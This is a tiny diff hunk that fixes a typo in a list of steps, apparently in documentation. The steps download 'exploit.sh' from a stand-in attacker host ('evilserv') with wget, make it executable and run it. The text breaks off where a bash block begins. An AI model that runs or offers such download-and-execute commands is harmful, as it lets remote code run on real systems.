@@ -68,7 +68,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
 
  - 1st : wget http://evilserv/exploit.sh
  - 2nd : chmod +x exploit.sh
- - 3rd : ./exploit.sj
+ - 3rd : ./exploit.sh
    
 ````bash
 #!/bin/bash
